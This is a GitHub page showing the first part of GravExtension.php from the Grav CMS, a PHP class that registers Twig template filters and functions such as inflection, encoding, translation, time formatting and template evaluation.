[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2Fdevelop%2Fsystem%2Fsrc%2FGrav%2FCommon%2FTwig%2FExtension%2FGravExtension.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

## Files

 develop
## Breadcrumbs

1. [grav](/getgrav/grav/tree/develop)
2. /[system](/getgrav/grav/tree/develop/system)
3. /[src](/getgrav/grav/tree/develop/system/src)
4. /[Grav](/getgrav/grav/tree/develop/system/src/Grav)
5. /[Common](/getgrav/grav/tree/develop/system/src/Grav/Common)
6. /[Twig](/getgrav/grav/tree/develop/system/src/Grav/Common/Twig)
7. /[Extension](/getgrav/grav/tree/develop/system/src/Grav/Common/Twig/Extension)
/
# GravExtension.php

Copy path Blame  Blame
## Latest commit

## History

[History](/getgrav/grav/commits/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php)1756 lines (1548 loc) · 51.4 KB develop
## Breadcrumbs

1. [grav](/getgrav/grav/tree/develop)
2. /[system](/getgrav/grav/tree/develop/system)
3. /[src](/getgrav/grav/tree/develop/system/src)
4. /[Grav](/getgrav/grav/tree/develop/system/src/Grav)
5. /[Common](/getgrav/grav/tree/develop/system/src/Grav/Common)
6. /[Twig](/getgrav/grav/tree/develop/system/src/Grav/Common/Twig)
7. /[Extension](/getgrav/grav/tree/develop/system/src/Grav/Common/Twig/Extension)
/
# GravExtension.php

Top
## File metadata and controls

* Code
* Blame

1756 lines (1548 loc) · 51.4 KB[Raw](https://github.com/getgrav/grav/raw/refs/heads/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000<?php
/\*\* \* @package Grav\Common\Twig \* \* @copyright Copyright (c) 2015 - 2025 Trilby Media, LLC. All rights reserved. \* @license MIT License; see LICENSE file for details. \*/
namespace Grav\Common\Twig\Extension;
use CallbackFilterIterator;use Cron\CronExpression;use Grav\Common\Config\Config;use Grav\Common\Data\Data;use Grav\Common\Debugger;use Grav\Common\Grav;use Grav\Common\Inflector;use Grav\Common\Language\Language;use Grav\Common\Page\Collection;use Grav\Common\Page\Interfaces\PageInterface;use Grav\Common\Page\Media;use Grav\Common\Scheduler\Cron;use Grav\Common\Security;use Grav\Common\Twig\TokenParser\TwigTokenParserCache;use Grav\Common\Twig\TokenParser\TwigTokenParserLink;use Grav\Common\Twig\TokenParser\TwigTokenParserRender;use Grav\Common\Twig\TokenParser\TwigTokenParserScript;use Grav\Common\Twig\TokenParser\TwigTokenParserStyle;use Grav\Common\Twig\TokenParser\TwigTokenParserSwitch;use Grav\Common\Twig\TokenParser\TwigTokenParserThrow;use Grav\Common\Twig\TokenParser\TwigTokenParserTryCatch;use Grav\Common\Twig\TokenParser\TwigTokenParserMarkdown;use Grav\Common\User\Interfaces\UserInterface;use Grav\Common\Utils;use Grav\Common\Yaml;use Grav\Common\Helpers\Base32;use Grav\Framework\Flex\Interfaces\FlexObjectInterface;use Grav\Framework\Psr7\Response;use Iterator;use JsonSerializable;use RocketTheme\Toolbox\ResourceLocator\UniformResourceLocator;use Traversable;use Twig\Environment;use Twig\Error\RuntimeError;use Twig\Extension\AbstractExtension;use Twig\Extension\GlobalsInterface;use Twig\Loader\FilesystemLoader;use Twig\Markup;use Twig\TwigFilter;use Twig\TwigFunction;use function array\_slice;use function count;use function func\_get\_args;use function func\_num\_args;use function get\_class;use function gettype;use function in\_array;use function is\_array;use function is\_bool;use function is\_float;use function is\_int;use function is\_numeric;use function is\_object;use function is\_scalar;use function is\_string;use function strlen;
/\*\* \* Class GravExtension \* @package Grav\Common\Twig\Extension \*/class GravExtension extends AbstractExtension implements GlobalsInterface{ /\*\* @var Grav \*/ protected $grav; /\*\* @var Debugger|null \*/ protected $debugger; /\*\* @var Config \*/ protected $config;
 /\*\* \* GravExtension constructor. \*/ public function \_\_construct() { $this->grav = Grav::instance(); $this->debugger = $this->grav['debugger'] ?? null; $this->config = $this->grav['config']; }
 /\*\* \* Register some standard globals \* \* @return array \*/ public function getGlobals(): array { return [ 'grav' => $this->grav, ]; }
 /\*\* \* Return a list of all filters. \* \* @return array \*/ public function getFilters(): array { return [ new TwigFilter('\*ize', [$this, 'inflectorFilter']), new TwigFilter('absolute\_url', [$this, 'absoluteUrlFilter']), new TwigFilter('contains', [$this, 'containsFilter']), new TwigFilter('chunk\_split', [$this, 'chunkSplitFilter']), new TwigFilter('nicenumber', [$this, 'niceNumberFunc']), new TwigFilter('nicefilesize', [$this, 'niceFilesizeFunc']), new TwigFilter('nicetime', [$this, 'nicetimeFunc']), new TwigFilter('defined', [$this, 'definedDefaultFilter']), new TwigFilter('ends\_with', [$this, 'endsWithFilter']), new TwigFilter('fieldName', [$this, 'fieldNameFilter']), new TwigFilter('parent\_field', [$this, 'fieldParentFilter']), new TwigFilter('ksort', [$this, 'ksortFilter']), new TwigFilter('ltrim', [$this, 'ltrimFilter']), new TwigFilter('markdown', [$this, 'markdownFunction'], ['needs\_context' => true, 'is\_safe' => ['html']]), new TwigFilter('md5', [$this, 'md5Filter']), new TwigFilter('base32\_encode', [$this, 'base32EncodeFilter']), new TwigFilter('base32\_decode', [$this, 'base32DecodeFilter']), new TwigFilter('base64\_encode', [$this, 'base64EncodeFilter']), new TwigFilter('base64\_decode', [$this, 'base64DecodeFilter']), new TwigFilter('randomize', [$this, 'randomizeFilter']), new TwigFilter('modulus', [$this, 'modulusFilter']), new TwigFilter('rtrim', [$this, 'rtrimFilter']), new TwigFilter('pad', [$this, 'padFilter']), new TwigFilter('regex\_replace', [$this, 'regexReplace']), new TwigFilter('safe\_email', [$this, 'safeEmailFilter'], ['is\_safe' => ['html']]), new TwigFilter('safe\_truncate', [Utils::class, 'safeTruncate']), new TwigFilter('safe\_truncate\_html', [Utils::class, 'safeTruncateHTML']), new TwigFilter('sort\_by\_key', [$this, 'sortByKeyFilter']), new TwigFilter('starts\_with', [$this, 'startsWithFilter']), new TwigFilter('truncate', [Utils::class, 'truncate']), new TwigFilter('truncate\_html', [Utils::class, 'truncateHTML']), new TwigFilter('json\_decode', [$this, 'jsonDecodeFilter']), new TwigFilter('array\_unique', 'array\_unique'), new TwigFilter('basename', 'basename'), new TwigFilter('dirname', 'dirname'), new TwigFilter('print\_r', [$this, 'print\_r']), new TwigFilter('yaml\_encode', [$this, 'yamlEncodeFilter']), new TwigFilter('yaml\_decode', [$this, 'yamlDecodeFilter']), new TwigFilter('nicecron', [$this, 'niceCronFilter']), new TwigFilter('replace\_last', [$this, 'replaceLastFilter']),
 // Translations new TwigFilter('t', [$this, 'translate'], ['needs\_environment' => true]), new TwigFilter('tl', [$this, 'translateLanguage']), new TwigFilter('ta', [$this, 'translateArray']),
 // Casting values new TwigFilter('string', [$this, 'stringFilter']), new TwigFilter('int', [$this, 'intFilter'], ['is\_safe' => ['all']]), new TwigFilter('bool', [$this, 'boolFilter']), new TwigFilter('float', [$this, 'floatFilter'], ['is\_safe' => ['all']]), new TwigFilter('array', [$this, 'arrayFilter']), new TwigFilter('yaml', [$this, 'yamlFilter']),
 // Object Types new TwigFilter('get\_type', [$this, 'getTypeFunc']), new TwigFilter('of\_type', [$this, 'ofTypeFunc']),
 // PHP methods new TwigFilter('count', 'count'), new TwigFilter('array\_diff', 'array\_diff'),
 // Security fixes new TwigFilter('filter', [$this, 'filterFunc'], ['needs\_environment' => true]), new TwigFilter('map', [$this, 'mapFunc'], ['needs\_environment' => true]), new TwigFilter('reduce', [$this, 'reduceFunc'], ['needs\_environment' => true]), ]; }
 /\*\* \* Return a list of all functions. \* \* @return array \*/ public function getFunctions(): array { return [ new TwigFunction('array', [$this, 'arrayFilter']), new TwigFunction('array\_key\_value', [$this, 'arrayKeyValueFunc']), new TwigFunction('array\_key\_exists', 'array\_key\_exists'), new TwigFunction('array\_unique', 'array\_unique'), new TwigFunction('array\_intersect', [$this, 'arrayIntersectFunc']), new TwigFunction('array\_diff', 'array\_diff'), new TwigFunction('authorize', [$this, 'authorize']), new TwigFunction('debug', [$this, 'dump'], ['needs\_context' => true, 'needs\_environment' => true]), new TwigFunction('dump', [$this, 'dump'], ['needs\_context' => true, 'needs\_environment' => true]), new TwigFunction('vardump', [$this, 'vardumpFunc']), new TwigFunction('print\_r', [$this, 'print\_r']), new TwigFunction('http\_response\_code', 'http\_response\_code'), new TwigFunction('evaluate', [$this, 'evaluateStringFunc'], ['needs\_context' => true]), new TwigFunction('evaluate\_twig', [$this, 'evaluateTwigFunc'], ['needs\_context' => true]), new TwigFunction('gist', [$this, 'gistFunc']), new TwigFunction('nonce\_field', [$this, 'nonceFieldFunc']), new TwigFunction('pathinfo', 'pathinfo'), new TwigFunction('parseurl', 'parse\_url'), new TwigFunction('random\_string', [$this, 'randomStringFunc']), new TwigFunction('repeat', [$this, 'repeatFunc']), new TwigFunction('regex\_replace', [$this, 'regexReplace']), new TwigFunction('regex\_filter', [$this, 'regexFilter']), new TwigFunction('regex\_match', [$this, 'regexMatch']), new TwigFunction('regex\_split', [$this, 'regexSplit']), new TwigFunction('string', [$this, 'stringFilter']), new TwigFunction('url', [$this, 'urlFunc']), new TwigFunction('json\_decode', [$this, 'jsonDecodeFilter']), new TwigFunction('get\_cookie', [$this, 'getCookie']), new TwigFunction('redirect\_me', [$this, 'redirectFunc']), new TwigFunction('range', [$this, 'rangeFunc']), new TwigFunction('isajaxrequest', [$this, 'isAjaxFunc']), new TwigFunction('exif', [$this, 'exifFunc']), new TwigFunction('media\_directory', [$this, 'mediaDirFunc']), new TwigFunction('body\_class', [$this, 'bodyClassFunc'], ['needs\_context' => true]), new TwigFunction('theme\_var', [$this, 'themeVarFunc'], ['needs\_context' => true]), new TwigFunction('header\_var', [$this, 'pageHeaderVarFunc'], ['needs\_context' => true]), new TwigFunction('read\_file', [$this, 'readFileFunc']), new TwigFunction('nicenumber', [$this, 'niceNumberFunc']), new TwigFunction('nicefilesize', [$this, 'niceFilesizeFunc']), new TwigFunction('nicetime', [$this, 'nicetimeFunc']), new TwigFunction('cron', [$this, 'cronFunc']), new TwigFunction('svg\_image', [$this, 'svgImageFunction']), new TwigFunction('xss', [$this, 'xssFunc']), new TwigFunction('unique\_id', [$this, 'uniqueId']),
 // Translations new TwigFunction('t', [$this, 'translate'], ['needs\_environment' => true]), new TwigFunction('tl', [$this, 'translateLanguage']), new TwigFunction('ta', [$this, 'translateArray']),
 // Object Types new TwigFunction('get\_type', [$this, 'getTypeFunc']), new TwigFunction('of\_type', [$this, 'ofTypeFunc']),
 // PHP methods new TwigFunction('is\_numeric', 'is\_numeric'), new TwigFunction('is\_iterable', 'is\_iterable'), new TwigFunction('is\_countable', 'is\_countable'), new TwigFunction('is\_null', 'is\_null'), new TwigFunction('is\_string', 'is\_string'), new TwigFunction('is\_array', 'is\_array'), new TwigFunction('is\_object', 'is\_object'), new TwigFunction('count', 'count'), new TwigFunction('array\_diff', 'array\_diff'), new TwigFunction('parse\_url', 'parse\_url'),
 // Security fixes new TwigFunction('filter', [$this, 'filterFunc'], ['needs\_environment' => true]), new TwigFunction('map', [$this, 'mapFunc'], ['needs\_environment' => true]), new TwigFunction('reduce', [$this, 'reduceFunc'], ['needs\_environment' => true]), ]; }
 /\*\* \* @return array \*/ public function getTokenParsers(): array { return [ new TwigTokenParserRender(), new TwigTokenParserThrow(), new TwigTokenParserTryCatch(), new TwigTokenParserScript(), new TwigTokenParserStyle(), new TwigTokenParserLink(), new TwigTokenParserMarkdown(), new TwigTokenParserSwitch(), new TwigTokenParserCache(), ]; }
 /\*\* \* @param mixed $var \* @return string \*/ public function print\_r($var) { return print\_r($var, true); }
 /\*\* \* Filters field name by changing dot notation into array notation. \* \* @param string $str \* @return string \*/ public function fieldNameFilter($str) { $path = explode('.', rtrim($str, '.'));
 return array\_shift($path) . ($path ? '[' . implode('][', $path) . ']' : ''); }
 /\*\* \* Filters field name by changing dot notation into array notation. \* \* @param string $str \* @return string \*/ public function fieldParentFilter($str) { $path = explode('.', rtrim($str, '.')); array\_pop($path);
 return implode('.', $path); }
 /\*\* \* Protects email address. \* \* @param string $str \* @return string \*/ public function safeEmailFilter($str) { static $list = [ '"' => '&#34;', "'" => '&#39;', '&' => '&amp;', '<' => '&lt;', '>' => '&gt;', '@' => '&#64;' ];
 $characters = mb\_str\_split($str, 1, 'UTF-8');
 $encoded = ''; foreach ($characters as $chr) { $encoded .= $list[$chr] ?? (random\_int(0, 1) ? '&#' . mb\_ord($chr) . ';' : $chr); }
 return $encoded; }
 /\*\* \* Returns array in a random order. \* \* @param array|Traversable $original \* @param int $offset Can be used to return only slice of the array. \* @return array \*/ public function randomizeFilter($original, $offset = 0) { if ($original instanceof Traversable) { $original = iterator\_to\_array($original, false); }
 if (!is\_array($original)) { return $original; }
 $sorted = []; $random = array\_slice($original, $offset); shuffle($random);
 $sizeOf = count($original); for ($x = 0; $x < $sizeOf; $x++) { if ($x < $offset) { $sorted[] = $original[$x]; } else { $sorted[] = array\_shift($random); } }
 return $sorted; }
 /\*\* \* Returns the modulus of an integer \* \* @param string|int $number \* @param int $divider \* @param array|null $items array of items to select from to return \* @return int \*/ public function modulusFilter($number, $divider, $items = null) { if (is\_string($number)) { $number = strlen($number); }
 $remainder = $number % $divider;
 if (is\_array($items)) { return $items[$remainder] ?? $items[0]; }
 return $remainder; }
 /\*\* \* Inflector supports following notations: \* \* `{{ 'person'|pluralize }} => people` \* `{{ 'shoes'|singularize }} => shoe` \* `{{ 'welcome page'|titleize }} => "Welcome Page"` \* `{{ 'send\_email'|camelize }} => SendEmail` \* `{{ 'CamelCased'|underscorize }} => camel\_cased` \* `{{ 'Something Text'|hyphenize }} => something-text` \* `{{ 'something\_text\_to\_read'|humanize }} => "Something text to read"` \* `{{ '181'|monthize }} => 5` \* `{{ '10'|ordinalize }} => 10th` \* \* @param string $action \* @param string $data \* @param int|null $count \* @return string \*/ public function inflectorFilter($action, $data, $count = null) { $action .= 'ize';
 /\*\* @var Inflector $inflector \*/ $inflector = $this->grav['inflector'];
 if (in\_array( $action, ['titleize', 'camelize', 'underscorize', 'hyphenize', 'humanize', 'ordinalize', 'monthize'], true )) { return $inflector->{$action}($data); }
 if (in\_array($action, ['pluralize', 'singularize'], true)) { return $count ? $inflector->{$action}($data, $count) : $inflector->{$action}($data); }
 return $data; }
 /\*\* \* Return MD5 hash from the input. \* \* @param string $str \* @return string \*/ public function md5Filter($str) { return md5($str); }
 /\*\* \* Return Base32 encoded string \* \* @param string $str \* @return string \*/ public function base32EncodeFilter($str) { return Base32::encode($str); }
 /\*\* \* Return Base32 decoded string \* \* @param string $str \* @return string \*/ public function base32DecodeFilter($str) { return Base32::decode($str); }
 /\*\* \* Return Base64 encoded string \* \* @param string $str \* @return string \*/ public function base64EncodeFilter($str) { return base64\_encode((string) $str); }
 /\*\* \* Return Base64 decoded string \* \* @param string $str \* @return string|false \*/ public function base64DecodeFilter($str) { return base64\_decode($str); }
 /\*\* \* Sorts a collection by key \* \* @param array $input \* @param string $filter \* @param int $direction \* @param int $sort\_flags \* @return array \*/ public function sortByKeyFilter($input, $filter, $direction = SORT\_ASC, $sort\_flags = SORT\_REGULAR) { return Utils::sortArrayByKey($input, $filter, $direction, $sort\_flags); }
 /\*\* \* Return ksorted collection. \* \* @param array|null $array \* @return array \*/ public function ksortFilter($array) { if (null === $array) { $array = []; } ksort($array);
 return $array; }
 /\*\* \* Wrapper for chunk\_split() function \* \* @param string $value \* @param int $chars \* @param string $split \* @return string \*/ public function chunkSplitFilter($value, $chars, $split = '-') { return chunk\_split($value, $chars, $split); }
 /\*\* \* determine if a string contains another \* \* @param string $haystack \* @param string $needle \* @return string|bool \* @todo returning $haystack here doesn't make much sense \*/ public function containsFilter($haystack, $needle) { if (empty($needle)) { return $haystack; }
 return (strpos($haystack, (string) $needle) !== false); }
 /\*\* \* Gets a human readable output for cron syntax \* \* @param string $at \* @return string \*/ public function niceCronFilter($at) { $cron = new Cron($at); return $cron->getText('en'); }
 /\*\* \* @param string|mixed $str \* @param string $search \* @param string $replace \* @return string|mixed \*/ public function replaceLastFilter($str, $search, $replace) { if (is\_string($str) && ($pos = mb\_strrpos($str, $search)) !== false) { $str = mb\_substr($str, 0, $pos) . $replace . mb\_substr($str, $pos + mb\_strlen($search)); }
 return $str; }
 /\*\* \* Get Cron object for a crontab 'at' format \* \* @param string $at \* @return CronExpression \*/ public function cronFunc($at) { return CronExpression::factory($at); }
 /\*\* \* displays a facebook style 'time ago' formatted date/time \* \* @param string $date \* @param bool $long\_strings \* @param bool $show\_tense \* @return string \*/ public function nicetimeFunc($date, $long\_strings = true, $show\_tense = true) { if (empty($date)) { return $this->grav['language']->translate('GRAV.NICETIME.NO\_DATE\_PROVIDED'); }
 if ($long\_strings) { $periods = [ 'NICETIME.SECOND', 'NICETIME.MINUTE', 'NICETIME.HOUR', 'NICETIME.DAY', 'NICETIME.WEEK', 'NICETIME.MONTH', 'NICETIME.YEAR', 'NICETIME.DECADE' ]; } else { $periods = [ 'NICETIME.SEC', 'NICETIME.MIN', 'NICETIME.HR', 'NICETIME.DAY', 'NICETIME.WK', 'NICETIME.MO', 'NICETIME.YR', 'NICETIME.DEC' ]; }
 $lengths = ['60', '60', '24', '7', '4.35', '12', '10'];
 $now = time();
 // check if unix timestamp if ((string)(int)$date === (string)$date) { $unix\_date = $date; } else { $unix\_date = strtotime($date); }
 // check validity of date if (empty($unix\_date)) { return $this->grav['language']->translate('GRAV.NICETIME.BAD\_DATE'); }
 // is it future date or past date if ($now > $unix\_date) { $difference = $now - $unix\_date; $tense = $this->grav['language']->translate('GRAV.NICETIME.AGO'); } elseif ($now == $unix\_date) { $difference = $now - $unix\_date; $tense = $this->grav['language']->translate('GRAV.NICETIME.JUST\_NOW'); } else { $difference = $unix\_date - $now; $tense = $this->grav['language']->translate('GRAV.NICETIME.FROM\_NOW'); }
 for ($j = 0; $difference >= $lengths[$j] && $j < count($lengths) - 1; $j++) { $difference /= $lengths[$j]; }
 $difference = round($difference);
 if ($difference != 1) { $periods[$j] .= '\_PLURAL'; }
 if ($this->grav['language']->getTranslation( $this->grav['language']->getLanguage(), $periods[$j] . '\_MORE\_THAN\_TWO' ) ) { if ($difference > 2) { $periods[$j] .= '\_MORE\_THAN\_TWO'; } }
 $periods[$j] = $this->grav['language']->translate('GRAV.'.$periods[$j]);
 if ($now == $unix\_date) { return $tense; }
 $time = "{$difference} {$periods[$j]}"; $time .= $show\_tense ? " {$tense}" : '';
 return $time; }
 /\*\* \* Allow quick check of a string for XSS Vulnerabilities \* \* @param string|array $data \* @return bool|string|array \*/ public function xssFunc($data) { if (!is\_array($data)) { return Security::detectXss($data); }
 $results = Security::detectXssFromArray($data); $results\_parts = array\_map(static function ($value, $key) { return $key.': \''.$value . '\''; }, array\_values($results), array\_keys($results));
 return implode(', ', $results\_parts); }
 /\*\* \* Generates a random string with configurable length, prefix and suffix. \* Unlike the built-in `uniqid()`, this string is non-conflicting and safe \* \* @param int $length \* @param array $options \* @return string \* @throws \Exception \*/ public function uniqueId(int $length = 9, array $options = ['prefix' => '', 'suffix' => '']): string { return Utils::uniqueId($length, $options); }
 /\*\* \* @param string $string \* @return string \*/ public function absoluteUrlFilter($string) { $url = $this->grav['uri']->base(); $string = preg\_replace('/((?:href|src) \*= \*[\'"](?!(http|ftp)))/i', "$1$url", $string);
 return $string; }
 /\*\* \* @param array $context \* @param string $string \* @param bool $block Block or Line processing \* @return string \*/ public function markdownFunction($context, $string, $block = true) { $page = $context['page'] ?? null; return Utils::processMarkdown($string, $block, $page); }
 /\*\* \* @param string $haystack \* @param string $needle \* @return bool \*/ public function startsWithFilter($haystack, $needle) { return Utils::startsWith($haystack, $needle); }
 /\*\* \* @param string $haystack \* @param string $needle \* @return bool \*/ public function endsWithFilter($haystack, $needle) { return Utils::endsWith($haystack, $needle); }
 /\*\* \* @param mixed $value \* @param null $default \* @return mixed|null \*/ public function definedDefaultFilter($value, $default = null) { return $value ?? $default; }
 /\*\* \* @param string $value \* @param string|null $chars \* @return string \*/ public function rtrimFilter($value, $chars = null) { return null !== $chars ? rtrim($value, $chars) : rtrim($value); }
 /\*\* \* @param string $value \* @param string|null $chars \* @return string \*/ public function ltrimFilter($value, $chars = null) { return null !== $chars ? ltrim($value, $chars) : ltrim($value); }
 /\*\* \* Returns a string from a value. If the value is array, return it json encoded \* \* @param mixed $value \* @return string \*/ public function stringFilter($value) { // Format the array as a string if (is\_array($value)) { return json\_encode($value); }
 // Boolean becomes '1' or '0' if (is\_bool($value)) { $value = (int)$value; }
 // Cast the other values to string. return (string)$value; }
 /\*\* \* Casts input to int. \* \* @param mixed $input \* @return int \*/ public function intFilter($input) { return (int) $input; }
 /\*\* \* Casts input to bool. \* \* @param mixed $input \* @return bool \*/ public function boolFilter($input) { return (bool) $input; }
 /\*\* \* Casts input to float. \* \* @param mixed $input \* @return float \*/ public function floatFilter($input) { return (float) $input; }
 /\*\* \* Casts input to array. \* \* @param mixed $input \* @return array \*/ public function arrayFilter($input) { if (is\_array($input)) { return $input; }
 if (is\_object($input)) { if (method\_exists($input, 'toArray')) { return $input->toArray(); }
 if ($input instanceof Iterator) { return iterator\_to\_array($input); } }
 return (array)$input; }
 /\*\* \* @param array|object $value \* @param int|null $inline \* @param int|null $indent \* @return string \*/ public function yamlFilter($value, $inline = null, $indent = null): string { return Yaml::dump($value, $inline, $indent); }
 /\*\* \* @param Environment $twig \* @return string \*/ public function translate(Environment $twig, ...$args) { // If admin and tu filter provided, use it if (isset($this->grav['admin'])) { $numargs = count($args); $lang = null;
 if (($numargs === 3 && is\_array($args[1])) || ($numargs === 2 && !is\_array($args[1]))) { $lang = array\_pop($args); /\*\* @var Language $language \*/ $language = $this->grav['language']; if (is\_string($lang) && !$language->getLanguageCode($lang)) { $args[] = $lang; $lang = null; } } elseif ($numargs === 2 && is\_array($args[1])) { $subs = array\_pop($args); $args = array\_merge($args, $subs); }
 return $this->grav['admin']->translate($args, $lang); }
 $translation = $this->grav['language']->translate($args);
 if ($this->config->get('system.languages.debug', false)) { $debugger = $this->grav['debugger']; $debugger->addMessage("$args[0] -> $translation", 'debug'); }
 return $translation; }
 /\*\* \* Translate Strings \* \* @param string|array $args \* @param array|null $languages \* @param bool $array\_support \* @param bool $html\_out \* @return string \*/ public function translateLanguage($args, array $languages = null, $array\_support = false, $html\_out = false) { /\*\* @var Language $language \*/ $language = $this->grav['language'];
 return $language->translate($args, $languages, $array\_support, $html\_out); }
 /\*\* \* @param string $key \* @param string $index \* @param array|null $lang \* @return string \*/ public function translateArray($key, $index, $lang = null) { /\*\* @var Language $language \*/ $language = $this->grav['language'];
 return $language->translateArray($key, $index, $lang); }
 /\*\* \* Repeat given string x times. \* \* @param string $input \* @param int $multiplier \* \* @return string \*/ public function repeatFunc($input, $multiplier) { return str\_repeat($input, (int) $multiplier); }
 /\*\* \* Return URL to the resource. \* \* @example {{ url('theme://images/logo.png')|default('http://www.placehold.it/150x100/f4f4f4') }} \* \* @param string $input Resource to be located. \* @param bool $domain True to include domain name. \* @param bool $failGracefully If true, return URL even if the file does not exist. \* @return string|false Returns url to the resource or null if resource was not found. \*/ public function urlFunc($input, $domain = false, $failGracefully = false) { return Utils::url($input, $domain, $failGracefully); }
 /\*\* \* This function will evaluate Twig $twig through the $environment, and return its results. \* \* @param array $context \* @param string $twig \* @return mixed \*/ public function evaluateTwigFunc($context, $twig) {
 $loader = new FilesystemLoader('.'); $env = new Environment($loader); $env->addExtension($this);
 $template = $env->createTemplate($twig);
[View remainder of file in raw view](https://github.com/getgrav/grav/raw/refs/heads/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


